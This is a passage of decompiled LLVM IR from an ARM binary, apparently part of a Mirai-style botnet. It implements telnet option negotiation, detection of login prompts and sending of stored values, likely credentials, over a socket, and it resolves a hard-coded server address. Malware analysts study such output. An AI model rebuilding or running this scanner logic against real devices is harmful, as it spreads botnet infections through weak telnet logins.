  store i32 ptrtoint ([22 x i8]* @global_var_196ec.91 to i32), i32* %r0.global-to-local, align 4
  %v2_f6d0 = call i32 @resolv_lookup(i32 ptrtoint ([22 x i8]* @global_var_196ec.91 to i32))
  store i32 %v2_f6d0, i32* %r0.global-to-local, align 4
  store i32 %v2_f6d0, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_f6d4 = icmp eq i32 %v2_f6d0, 0
  store i1 %v3_f6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f6d4, label %dec_label_pc_f6dc, label %dec_label_pc_1011c

dec_label_pc_f6dc:                                ; preds = %dec_label_pc_f6c4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 %v2_f674, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_19704.97 to i32), i32* @r0, align 4
  %v2_f6ec = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_19704.97 to i32))
  %v0_f6f0 = load i32, i32* @r7, align 4
  store i32 %v0_f6f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_f6fc = inttoptr i32 %v0_f6f0 to i32*
  %v3_f6fc = call i32 @table_retrieve_val(i32 2, i32* %v2_f6fc)
  %v4_f6fc = inttoptr i32 %v3_f6fc to i16*
  store i32 %v3_f6fc, i32* %r0.global-to-local, align 4
  %v3_f700 = load i16, i16* %v4_f6fc, align 2
  %v4_f700 = zext i16 %v3_f700 to i32
  store i32 %v4_f700, i32* %r0.global-to-local, align 4
  store i32 %v2_f674, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f70c

dec_label_pc_f70c:                                ; preds = %.thread84, %bb430, %dec_label_pc_f6dc
  %v0_f70c = load i32, i32* @r6, align 4
  %v1_f70c = add i32 %v0_f70c, 4
  %v2_f70c = inttoptr i32 %v1_f70c to i32*
  %v3_f70c = load i32, i32* %v2_f70c, align 4
  store i32 %v3_f70c, i32* %r0.global-to-local, align 4
  %v1_f710 = call i32 @__GI___libc_close(i32 %v3_f70c)
  store i32 %v1_f710, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f71c = load i32, i32* @r6, align 4
  %v2_f71c = add i32 %v1_f71c, 4
  %v3_f71c = inttoptr i32 %v2_f71c to i32*
  store i32 -1, i32* %v3_f71c, align 4
  %v0_f720 = load i32, i32* %r2.global-to-local, align 4
  %v1_f720 = load i32, i32* @r6, align 4
  %v2_f720 = add i32 %v1_f720, 12
  %v3_f720 = inttoptr i32 %v2_f720 to i32*
  store i32 %v0_f720, i32* %v3_f720, align 4
  br label %dec_label_pc_f724

dec_label_pc_f724:                                ; preds = %dec_label_pc_f8e8, %bb439, %dec_label_pc_feb4, %dec_label_pc_f664, %dec_label_pc_ff58, %dec_label_pc_fca4, %dec_label_pc_f70c
  %v0_f724 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f724 = icmp eq i32 %v0_f724, 0
  store i1 %v2_f724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f724, label %dec_label_pc_f4b8.loopexit, label %dec_label_pc_f72c

dec_label_pc_f72c:                                ; preds = %dec_label_pc_f724, %dec_label_pc_fd58, %dec_label_pc_fb98, %dec_label_pc_fa48, %dec_label_pc_f974, %dec_label_pc_f7d0, %dec_label_pc_1002c, %dec_label_pc_ffd0
  %v0_f72c = load i32, i32* @r6, align 4
  %v1_f72c = add i32 %v0_f72c, 24
  %v2_f72c = inttoptr i32 %v1_f72c to i32*
  %v3_f72c = load i32, i32* %v2_f72c, align 4
  %v0_f730 = load i32, i32* @r8, align 4
  %v2_f730 = sub i32 %v0_f730, %v3_f72c
  %v3_f730 = icmp uge i32 %v0_f730, %v3_f72c
  store i1 %v3_f730, i1* %cpsr_c.global-to-local, align 1
  %v4_f730 = xor i32 %v0_f730, %v3_f72c
  %v5_f730 = xor i32 %v2_f730, %v0_f730
  %v6_f730 = and i32 %v5_f730, %v4_f730
  %v7_f730 = icmp slt i32 %v6_f730, 0
  %v8_f730 = icmp slt i32 %v2_f730, 0
  %v9_f730 = icmp eq i32 %v0_f730, %v3_f72c
  store i1 %v9_f730, i1* %cpsr_z.global-to-local, align 1
  %v2_f734 = xor i1 %v8_f730, %v7_f730
  %v0_f730.v3_f72c = select i1 %v2_f734, i32 %v0_f730, i32 %v3_f72c
  store i32 %v0_f730.v3_f72c, i32* %r1.global-to-local, align 4
  %v2_f73c = sub i32 %v3_f72c, %v0_f730.v3_f72c
  store i32 %v2_f73c, i32* @r2, align 4
  store i32 %v2_f73c, i32* %v2_f72c, align 4
  %v0_f744 = load i32, i32* @fp, align 4
  %v1_f744 = load i32, i32* %r1.global-to-local, align 4
  %v2_f744 = add i32 %v1_f744, %v0_f744
  store i32 %v2_f744, i32* @r1, align 4
  store i32 %v0_f744, i32* @r0, align 4
  %v3_f74c = call i32 @memmove(i32 %v0_f744, i32 %v2_f744, i32 %v2_f73c)
  store i32 %v3_f74c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f53c

dec_label_pc_f754:                                ; preds = %dec_label_pc_f53c
  %v1_f754 = add i32 %v0_f53c, 24
  %v2_f754 = inttoptr i32 %v1_f754 to i32*
  %v3_f754 = load i32, i32* %v2_f754, align 4
  store i32 %v3_f754, i32* %r2.global-to-local, align 4
  %v1_f758 = add i32 %v3_f754, -1
  store i32 %v1_f758, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f75c = icmp eq i32 %v1_f758, 0
  store i1 %v2_f75c, i1* %cpsr_z.global-to-local, align 1
  %tmp433 = icmp slt i32 %v1_f758, 1
  br i1 %tmp433, label %dec_label_pc_f4bc.backedge.thread, label %dec_label_pc_f764

dec_label_pc_f764:                                ; preds = %dec_label_pc_f754
  %v2_f764 = add i32 %v1_f758, %v0_f53c
  store i32 %v2_f764, i32* %r3.global-to-local, align 4
  %v1_f768 = add i32 %v2_f764, 28
  %v2_f768 = inttoptr i32 %v1_f768 to i8*
  %v3_f768 = load i8, i8* %v2_f768, align 1
  %v4_f768 = zext i8 %v3_f768 to i32
  store i32 %v4_f768, i32* %r3.global-to-local, align 4
  %v2_f76c = icmp ugt i8 %v3_f768, 61
  store i1 %v2_f76c, i1* %cpsr_c.global-to-local, align 1
  %v7_f76c = icmp eq i8 %v3_f768, 62
  store i1 %v7_f76c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f76c, label %dec_label_pc_f7d0, label %bb434

bb434:                                            ; preds = %dec_label_pc_f764
  %v3_f770 = icmp ugt i8 %v3_f768, 57
  store i1 %v3_f770, i1* %cpsr_c.global-to-local, align 1
  %v8_f770 = icmp eq i8 %v3_f768, 58
  store i1 %v8_f770, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f770, label %dec_label_pc_f7d0, label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %bb434
  %v2_f778 = icmp ugt i8 %v3_f768, 35
  store i1 %v2_f778, i1* %cpsr_c.global-to-local, align 1
  %v7_f778 = icmp eq i8 %v3_f768, 36
  store i1 %v7_f778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f778, label %dec_label_pc_f7d0, label %dec_label_pc_f780

dec_label_pc_f780:                                ; preds = %dec_label_pc_f778
  %v2_f780 = icmp ugt i8 %v3_f768, 34
  store i1 %v2_f780, i1* %cpsr_c.global-to-local, align 1
  %v7_f780 = icmp eq i8 %v3_f768, 35
  store i1 %v7_f780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f780, label %dec_label_pc_f7d0, label %dec_label_pc_f788

dec_label_pc_f788:                                ; preds = %dec_label_pc_f780
  %v2_f788 = icmp ugt i8 %v3_f768, 36
  store i1 %v2_f788, i1* %cpsr_c.global-to-local, align 1
  %v7_f788 = icmp eq i8 %v3_f768, 37
  store i1 %v7_f788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f788, label %dec_label_pc_f7d0, label %dec_label_pc_f7b8.preheader

dec_label_pc_f7b8.preheader:                      ; preds = %dec_label_pc_f788
  %v3_f78c = add i32 %v0_f53c, 28
  %v2_f790 = add i32 %v3_f78c, %v3_f754
  store i32 %v2_f790, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f7b8

dec_label_pc_f79c:                                ; preds = %bb435
  %v2_f79c = icmp ugt i8 %v3_f7c0, 35
  store i1 %v2_f79c, i1* %cpsr_c.global-to-local, align 1
  %v7_f79c = icmp eq i8 %v3_f7c0, 36
  store i1 %v7_f79c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f79c, label %dec_label_pc_f7d0, label %dec_label_pc_f7a4

dec_label_pc_f7a4:                                ; preds = %dec_label_pc_f79c
  %v2_f7a4 = icmp ugt i8 %v3_f7c0, 34
  store i1 %v2_f7a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7a4 = icmp eq i8 %v3_f7c0, 35
  store i1 %v7_f7a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7a4, label %dec_label_pc_f7d0, label %dec_label_pc_f7ac

dec_label_pc_f7ac:                                ; preds = %dec_label_pc_f7a4
  %v2_f7ac = icmp ugt i8 %v3_f7c0, 36
  store i1 %v2_f7ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f7ac = icmp eq i8 %v3_f7c0, 37
  store i1 %v7_f7ac, i1* %cpsr_z.global-to-local, align 1
  %v1_f7b0 = add i32 %v0_f7b0, -1
  store i32 %v1_f7b0, i32* %r3.global-to-local, align 4
  br i1 %v7_f7ac, label %dec_label_pc_f7d0, label %dec_label_pc_f7b8

dec_label_pc_f7b8:                                ; preds = %dec_label_pc_f7b8.preheader, %dec_label_pc_f7ac
  %v0_f7b0 = phi i32 [ %v2_f790, %dec_label_pc_f7b8.preheader ], [ %v1_f7b0, %dec_label_pc_f7ac ]
  %v0_f7b8 = phi i32 [ %v1_f758, %dec_label_pc_f7b8.preheader ], [ %v1_f7b8, %dec_label_pc_f7ac ]
  %v1_f7b8 = add i32 %v0_f7b8, -1
  store i32 %v1_f7b8, i32* %r1.global-to-local, align 4
  %v2_f7b8 = icmp ne i32 %v0_f7b8, 0
  store i1 %v2_f7b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f7b8 = icmp eq i32 %v0_f7b8, 1
  store i1 %v7_f7b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7b8, label %dec_label_pc_f4bc.backedge.thread565, label %dec_label_pc_f7c0

dec_label_pc_f7c0:                                ; preds = %dec_label_pc_f7b8
  %v1_f7c0 = add i32 %v0_f7b0, -2
  %v2_f7c0 = inttoptr i32 %v1_f7c0 to i8*
  %v3_f7c0 = load i8, i8* %v2_f7c0, align 1
  %v4_f7c0 = zext i8 %v3_f7c0 to i32
  store i32 %v4_f7c0, i32* %r2.global-to-local, align 4
  %v2_f7c4 = icmp ugt i8 %v3_f7c0, 61
  store i1 %v2_f7c4, i1* %cpsr_c.global-to-local, align 1
  %v7_f7c4 = icmp eq i8 %v3_f7c0, 62
  store i1 %v7_f7c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f7c4, label %dec_label_pc_f7d0, label %bb435

bb435:                                            ; preds = %dec_label_pc_f7c0
  %v3_f7c8 = icmp ugt i8 %v3_f7c0, 57
  store i1 %v3_f7c8, i1* %cpsr_c.global-to-local, align 1
  %v8_f7c8 = icmp eq i8 %v3_f7c0, 58
  store i1 %v8_f7c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f7c8, label %dec_label_pc_f7d0, label %dec_label_pc_f79c

dec_label_pc_f7d0:                                ; preds = %dec_label_pc_f7c0, %bb435, %dec_label_pc_f7ac, %dec_label_pc_f7a4, %dec_label_pc_f79c, %dec_label_pc_f788, %dec_label_pc_f764, %dec_label_pc_f780, %dec_label_pc_f778, %bb434
  %v0_f7d4 = phi i32 [ %v1_f758, %dec_label_pc_f788 ], [ %v1_f758, %dec_label_pc_f764 ], [ %v1_f758, %dec_label_pc_f780 ], [ %v1_f758, %dec_label_pc_f778 ], [ %v1_f758, %bb434 ], [ %v1_f7b8, %dec_label_pc_f79c ], [ %v1_f7b8, %dec_label_pc_f7a4 ], [ %v1_f7b8, %dec_label_pc_f7ac ], [ %v1_f7b8, %bb435 ], [ %v1_f7b8, %dec_label_pc_f7c0 ]
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f7d4 = add i32 %v0_f7d4, 1
  store i32 %v1_f7d4, i32* @r8, align 4
  %v1_f7d8 = call i32 @table_unlock_val(i32 8)
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_f7e8 = call i32 @table_retrieve_val(i32 8, i32* nonnull %stack_var_-60)
  store i32 %v3_f7e8, i32* %r0.global-to-local, align 4
  %v3_f7ec = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f7ec, i32* %r2.global-to-local, align 4
  store i32 %v3_f7e8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f7f8 = load i32, i32* @r6, align 4
  %v1_f7f8 = add i32 %v0_f7f8, 4
  %v2_f7f8 = inttoptr i32 %v1_f7f8 to i32*
  %v3_f7f8 = load i32, i32* %v2_f7f8, align 4
  store i32 %v3_f7f8, i32* %r0.global-to-local, align 4
  %v4_f7fc = call i32 @__libc_send(i32 %v3_f7f8, i32 %v3_f7e8, i32 %v3_f7ec, i32 16384)
  store i32 %v4_f7fc, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f80c = load i32, i32* @r6, align 4
  %v1_f80c = add i32 %v0_f80c, 4
  %v2_f80c = inttoptr i32 %v1_f80c to i32*
  %v3_f80c = load i32, i32* %v2_f80c, align 4
  store i32 %v3_f80c, i32* %r0.global-to-local, align 4
  %v4_f810 = call i32 @__libc_send(i32 %v3_f80c, i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_f818 = call i32 @table_lock_val(i32 8)
  store i32 %v1_f818, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_f820 = load i32, i32* @r6, align 4
  %v2_f820 = add i32 %v1_f820, 12
  %v3_f820 = inttoptr i32 %v2_f820 to i32*
  store i32 10, i32* %v3_f820, align 4
  br label %dec_label_pc_f72c

dec_label_pc_f828:                                ; preds = %dec_label_pc_f53c
  %v1_f828 = add i32 %v0_f53c, 24
  %v2_f828 = inttoptr i32 %v1_f828 to i32*
  %v3_f828 = load i32, i32* %v2_f828, align 4
  store i32 %v3_f828, i32* %r1.global-to-local, align 4
  %v0_f82c = load i32, i32* @fp, align 4
  store i32 %v0_f82c, i32* @r4, align 4
  store i32 0, i32* @r8, align 4
  %v3_f834172 = icmp eq i32 %v3_f828, 0
  store i1 %v3_f834172, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_f834172, i1* %cpsr_z.global-to-local, align 1
  %v6_f838179 = icmp sgt i32 %v3_f828, 0
  br i1 %v6_f838179, label %dec_label_pc_f83c.preheader, label %dec_label_pc_f8e8

dec_label_pc_f834.loopexit:                       ; preds = %dec_label_pc_f858
  %v2_f860 = add i32 %v1_f860, 2
  store i32 %v2_f860, i32* @r4, align 4
  %v2_f864 = add i32 %v1_f864, 2
  store i32 %v2_f864, i32* @r8, align 4
  %v3_f834 = icmp uge i32 %v2_f864, %v1_f834
  store i1 %v3_f834, i1* %cpsr_c.global-to-local, align 1
  %v9_f834 = icmp eq i32 %v2_f864, %v1_f834
  store i1 %v9_f834, i1* %cpsr_z.global-to-local, align 1
  %v6_f838 = icmp slt i32 %v2_f864, %v1_f834
  br i1 %v6_f838, label %dec_label_pc_f83c.preheader, label %dec_label_pc_f8e8

dec_label_pc_f83c.preheader:                      ; preds = %dec_label_pc_f828, %dec_label_pc_f834.loopexit
  %v6_f8f0277 = phi i32 [ %v6_f8f0278, %dec_label_pc_f834.loopexit ], [ %v0_f53c, %dec_label_pc_f828 ]
  %v1_f864266 = phi i32 [ %v2_f864, %dec_label_pc_f834.loopexit ], [ 0, %dec_label_pc_f828 ]
  %v1_f848264 = phi i32 [ %v1_f834, %dec_label_pc_f834.loopexit ], [ %v3_f828, %dec_label_pc_f828 ]
  %v0_f83c262 = phi i32 [ %v2_f860, %dec_label_pc_f834.loopexit ], [ %v0_f82c, %dec_label_pc_f828 ]
  br label %dec_label_pc_f83c

dec_label_pc_f83c:                                ; preds = %dec_label_pc_f83c.preheader, %dec_label_pc_f8cc
  %v6_f8f0278 = phi i32 [ %v6_f8f0277, %dec_label_pc_f83c.preheader ], [ %v0_f8d4, %dec_label_pc_f8cc ]
  %v1_f864 = phi i32 [ %v1_f864266, %dec_label_pc_f83c.preheader ], [ %v1_f8d8, %dec_label_pc_f8cc ]
  %v1_f834 = phi i32 [ %v1_f848264, %dec_label_pc_f83c.preheader ], [ %v3_f8d4, %dec_label_pc_f8cc ]
  %v1_f860 = phi i32 [ %v0_f83c262, %dec_label_pc_f83c.preheader ], [ %v1_f8e0, %dec_label_pc_f8cc ]
  %v1_f83c = inttoptr i32 %v1_f860 to i8*
  %v2_f83c = load i8, i8* %v1_f83c, align 1
  %v3_f83c = zext i8 %v2_f83c to i32
  store i32 %v3_f83c, i32* @r3, align 4
  %v2_f840 = icmp eq i8 %v2_f83c, -1
  store i1 %v2_f840, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f840, label %dec_label_pc_f848, label %dec_label_pc_f8e8

dec_label_pc_f848:                                ; preds = %dec_label_pc_f83c
  %v0_f848 = load i32, i32* @fp, align 4
  %v2_f848 = add i32 %v0_f848, %v1_f834
  store i32 %v2_f848, i32* %r2.global-to-local, align 4
  %v1_f84c = add i32 %v1_f860, 1
  store i32 %v1_f84c, i32* @r5, align 4
  %v3_f850 = icmp uge i32 %v2_f848, %v1_f84c
  store i1 %v3_f850, i1* %cpsr_c.global-to-local, align 1
  %v9_f850 = icmp eq i32 %v2_f848, %v1_f84c
  store i1 %v9_f850, i1* %cpsr_z.global-to-local, align 1
  %v2_f854 = xor i1 %v3_f850, true
  %v3_f854 = or i1 %v9_f850, %v2_f854
  br i1 %v3_f854, label %dec_label_pc_f8e8, label %dec_label_pc_f858

dec_label_pc_f858:                                ; preds = %dec_label_pc_f848
  %v2_f858 = inttoptr i32 %v1_f84c to i8*
  %v3_f858 = load i8, i8* %v2_f858, align 1
  %v4_f858 = zext i8 %v3_f858 to i32
  store i32 %v4_f858, i32* @r3, align 4
  %v2_f85c = icmp eq i8 %v3_f858, -1
  store i1 %v2_f85c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f85c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f85c, label %dec_label_pc_f834.loopexit, label %dec_label_pc_f86c

dec_label_pc_f86c:                                ; preds = %dec_label_pc_f858
  %v2_f86c = icmp ugt i8 %v3_f858, -4
  store i1 %v2_f86c, i1* %cpsr_c.global-to-local, align 1
  %v7_f86c = icmp eq i8 %v3_f858, -3
  store i1 %v7_f86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f86c, label %dec_label_pc_fed0, label %dec_label_pc_f874

dec_label_pc_f874:                                ; preds = %dec_label_pc_f86c
  %v1_f874 = add i32 %v1_f860, 2
  store i32 %v1_f874, i32* @r3, align 4
  %v3_f878 = icmp uge i32 %v2_f848, %v1_f874
  store i1 %v3_f878, i1* %cpsr_c.global-to-local, align 1
  %v9_f878 = icmp eq i32 %v2_f848, %v1_f874
  store i1 %v9_f878, i1* %cpsr_z.global-to-local, align 1
  %v2_f87c = xor i1 %v3_f878, true
  %v3_f87c = or i1 %v9_f878, %v2_f87c
  br i1 %v3_f87c, label %dec_label_pc_f8e8, label %dec_label_pc_f880

dec_label_pc_f880:                                ; preds = %dec_label_pc_ff34, %bb459, %.thread145, %dec_label_pc_f874
  %v0_f880 = load i32, i32* @r5, align 4
  %v1_f880 = inttoptr i32 %v0_f880 to i8*
  %v2_f880 = load i8, i8* %v1_f880, align 1
  %v3_f880 = zext i8 %v2_f880 to i32
  store i32 %v3_f880, i32* %r3.global-to-local, align 4
  %v2_f884 = icmp ugt i8 %v2_f880, -4
  store i1 %v2_f884, i1* %cpsr_c.global-to-local, align 1
  %v7_f884 = icmp eq i8 %v2_f880, -3
  store i1 %v7_f884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f884, label %.thread95, label %dec_label_pc_f894

.thread95:                                        ; preds = %dec_label_pc_f880
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f880, align 1
  %v0_f890.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f890.pr.pr, label %.thread98, label %.thread95.dec_label_pc_f894thread-pre-split_crit_edge

.thread95.dec_label_pc_f894thread-pre-split_crit_edge: ; preds = %.thread95
  %v0_f894.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f894

dec_label_pc_f894:                                ; preds = %dec_label_pc_f880, %.thread95.dec_label_pc_f894thread-pre-split_crit_edge
  %v0_f894.pr = phi i32 [ %v0_f894.pr.pre, %.thread95.dec_label_pc_f894thread-pre-split_crit_edge ], [ %v3_f880, %dec_label_pc_f880 ]
  %v2_f894 = icmp ugt i32 %v0_f894.pr, 250
  store i1 %v2_f894, i1* %cpsr_c.global-to-local, align 1
  %v7_f894 = icmp eq i32 %v0_f894.pr, 251
  store i1 %v7_f894, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f894, label %bb436, label %.thread98

bb436:                                            ; preds = %dec_label_pc_f894
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f89c = load i32, i32* @r5, align 4
  %v4_f89c = inttoptr i32 %v3_f89c to i8*
  store i8 -3, i8* %v4_f89c, align 1
  br label %.thread98

.thread98:                                        ; preds = %dec_label_pc_f894, %.thread95, %bb436
  %v0_f8a0 = load i32, i32* @r4, align 4
  %v1_f8a0 = add i32 %v0_f8a0, 2
  %v2_f8a0 = inttoptr i32 %v1_f8a0 to i8*
  %v3_f8a0 = load i8, i8* %v2_f8a0, align 1
  %v4_f8a0 = zext i8 %v3_f8a0 to i32
  store i32 %v4_f8a0, i32* %r3.global-to-local, align 4
  %v2_f8a4 = icmp ugt i8 %v3_f8a0, -4
  store i1 %v2_f8a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f8a4 = icmp eq i8 %v3_f8a0, -3
  store i1 %v7_f8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8a4, label %.thread99, label %dec_label_pc_f8b4

.thread99:                                        ; preds = %.thread98
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_f8a0, align 1
  %v0_f8b0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f8b0.pr.pr, label %.thread102, label %.thread99.dec_label_pc_f8b4thread-pre-split_crit_edge

.thread99.dec_label_pc_f8b4thread-pre-split_crit_edge: ; preds = %.thread99
  %v0_f8b4.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f8b4

dec_label_pc_f8b4:                                ; preds = %.thread98, %.thread99.dec_label_pc_f8b4thread-pre-split_crit_edge
  %v0_f8b4.pr = phi i32 [ %v0_f8b4.pr.pre, %.thread99.dec_label_pc_f8b4thread-pre-split_crit_edge ], [ %v4_f8a0, %.thread98 ]
  %v2_f8b4 = icmp ugt i32 %v0_f8b4.pr, 250
  store i1 %v2_f8b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f8b4 = icmp eq i32 %v0_f8b4.pr, 251
  store i1 %v7_f8b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8b4, label %bb437, label %.thread102

bb437:                                            ; preds = %dec_label_pc_f8b4
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f8bc = load i32, i32* @r4, align 4
  %v4_f8bc = add i32 %v3_f8bc, 2
  %v5_f8bc = inttoptr i32 %v4_f8bc to i8*
  store i8 -3, i8* %v5_f8bc, align 1
  br label %.thread102

.thread102:                                       ; preds = %dec_label_pc_f8b4, %.thread99, %bb437
  %v0_f8c0 = load i32, i32* @r6, align 4
  %v1_f8c0 = add i32 %v0_f8c0, 4
  %v2_f8c0 = inttoptr i32 %v1_f8c0 to i32*
  %v3_f8c0 = load i32, i32* %v2_f8c0, align 4
  store i32 %v3_f8c0, i32* %r0.global-to-local, align 4
  %v0_f8c4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_f8cc:                                ; preds = %dec_label_pc_ffe4, %.thread102
  %v0_f8d0 = phi i32 [ %v3_fff8, %dec_label_pc_ffe4 ], [ %v3_f8c0, %.thread102 ]
  %storemerge3 = phi i32 [ %v2_fee8, %dec_label_pc_ffe4 ], [ %v0_f8c4, %.thread102 ]
  %storemerge2 = phi i32 [ 9, %dec_label_pc_ffe4 ], [ 3, %.thread102 ]
  store i32 %storemerge3, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f8d0 = call i32 @__libc_send(i32 %v0_f8d0, i32 %storemerge3, i32 %storemerge2, i32 16384)
  store i32 %v4_f8d0, i32* %r0.global-to-local, align 4
  %v0_f8d4 = load i32, i32* @r6, align 4
  %v1_f8d4 = add i32 %v0_f8d4, 24
  %v2_f8d4 = inttoptr i32 %v1_f8d4 to i32*
  %v3_f8d4 = load i32, i32* %v2_f8d4, align 4
  store i32 %v3_f8d4, i32* %r1.global-to-local, align 4
  %v0_f8d8 = load i32, i32* @r8, align 4
  %v1_f8d8 = add i32 %v0_f8d8, 3
  store i32 %v1_f8d8, i32* @r8, align 4
  %v3_f8dc = icmp uge i32 %v1_f8d8, %v3_f8d4
  store i1 %v3_f8dc, i1* %cpsr_c.global-to-local, align 1
  %v9_f8dc = icmp eq i32 %v1_f8d8, %v3_f8d4
  store i1 %v9_f8dc, i1* %cpsr_z.global-to-local, align 1
  %v0_f8e0 = load i32, i32* @r4, align 4
  %v1_f8e0 = add i32 %v0_f8e0, 3
  store i32 %v1_f8e0, i32* @r4, align 4
  %v5_f8e4 = icmp slt i32 %v1_f8d8, %v3_f8d4
  br i1 %v5_f8e4, label %dec_label_pc_f83c, label %dec_label_pc_f8e8

dec_label_pc_f8e8:                                ; preds = %dec_label_pc_f834.loopexit, %dec_label_pc_f83c, %dec_label_pc_f8cc, %dec_label_pc_f874, %dec_label_pc_f848, %dec_label_pc_f828, %dec_label_pc_fed0.dec_label_pc_f8e8.loopexit_crit_edge
  %v6_f8f0 = phi i32 [ %v0_ff00, %dec_label_pc_fed0.dec_label_pc_f8e8.loopexit_crit_edge ], [ %v0_f53c, %dec_label_pc_f828 ], [ %v6_f8f0278, %dec_label_pc_f83c ], [ %v0_f8d4, %dec_label_pc_f8cc ], [ %v6_f8f0278, %dec_label_pc_f874 ], [ %v6_f8f0278, %dec_label_pc_f848 ], [ %v6_f8f0278, %dec_label_pc_f834.loopexit ]
  %v0_f8e8 = phi i32 [ %v0_f8e8.pre.pre, %dec_label_pc_fed0.dec_label_pc_f8e8.loopexit_crit_edge ], [ 0, %dec_label_pc_f828 ], [ %v1_f864, %dec_label_pc_f83c ], [ %v1_f8d8, %dec_label_pc_f8cc ], [ %v1_f864, %dec_label_pc_f874 ], [ %v1_f864, %dec_label_pc_f848 ], [ %v2_f864, %dec_label_pc_f834.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f8e8 = icmp eq i32 %v0_f8e8, 0
  store i1 %v2_f8e8, i1* %cpsr_z.global-to-local, align 1
  %tmp438 = icmp slt i32 %v0_f8e8, 1
  br i1 %tmp438, label %dec_label_pc_f724, label %bb439

bb439:                                            ; preds = %dec_label_pc_f8e8
  store i32 3, i32* @r3, align 4
  %v7_f8f0 = add i32 %v6_f8f0, 12
  %v8_f8f0 = inttoptr i32 %v7_f8f0 to i32*
  store i32 3, i32* %v8_f8f0, align 4
  br label %dec_label_pc_f724

dec_label_pc_f8f8:                                ; preds = %dec_label_pc_f53c
  %v1_f8f8 = add i32 %v0_f53c, 24
  %v2_f8f8 = inttoptr i32 %v1_f8f8 to i32*
  %v3_f8f8 = load i32, i32* %v2_f8f8, align 4
  store i32 %v3_f8f8, i32* %r2.global-to-local, align 4
  %v1_f8fc = add i32 %v3_f8f8, -1
  store i32 %v1_f8fc, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f900 = icmp eq i32 %v1_f8fc, 0
  store i1 %v2_f900, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_f8fc, 1
  br i1 %tmp440, label %dec_label_pc_f4bc.backedge.thread, label %dec_label_pc_f908

dec_label_pc_f908:                                ; preds = %dec_label_pc_f8f8
  %v2_f908 = add i32 %v1_f8fc, %v0_f53c
  store i32 %v2_f908, i32* %r3.global-to-local, align 4
  %v1_f90c = add i32 %v2_f908, 28
  %v2_f90c = inttoptr i32 %v1_f90c to i8*
  %v3_f90c = load i8, i8* %v2_f90c, align 1
  %v4_f90c = zext i8 %v3_f90c to i32
  store i32 %v4_f90c, i32* %r3.global-to-local, align 4
  %v2_f910 = icmp ugt i8 %v3_f90c, 61
  store i1 %v2_f910, i1* %cpsr_c.global-to-local, align 1
